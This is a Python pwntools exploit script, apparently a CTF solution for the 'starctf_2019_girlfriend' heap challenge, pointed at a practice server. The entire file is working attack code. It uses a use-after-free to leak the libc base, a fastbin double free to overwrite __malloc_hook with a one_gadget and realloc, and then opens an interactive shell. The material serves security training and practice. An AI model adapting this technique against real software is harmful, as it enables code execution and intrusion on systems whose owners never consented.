#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/26 10:22:18
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('starctf_2019_girlfriend')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node4.buuoj.cn'
    port = 29998
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('starctf_2019_girlfriend')
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil("Input your choice:")
    sh.sendline(str(choice))

def add(size,name,num):
    cmd(1)
    sh.recvuntil("Please input the size of girl's name\n")
    sh.sendline(str(size))
    sh.recvuntil("please inpute her name:\n")
    sh.sendline(name)
    sh.recvuntil("please input her call:\n")
    sh.sendline(num)

def show(idx):
    cmd(2)
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(idx))

def dele(idx):
    cmd(4)
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(idx))

add(0x80,'a','a')
add(0x80,'a','a')
dele(0)
show(0)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3c4b78
log.info("libc_base=>{}".format(hex(libc_base)))
malloc_hook = libc_base + libc.symbols['__malloc_hook']
realloc=libc_base+libc.sym['realloc']
one = libc_base + 0xf1147
add(0x60,'a','a')
add(0x60,'a','a')
dele(2)
dele(3)
dele(2)
add(0x60,p64(malloc_hook-0x23),'a')
add(0x60,'aa','a')
add(0x60,'aa','a')
add(0x60,'a'*11+p64(one)+p64(realloc),'111')
cmd(1)
sh.interactive()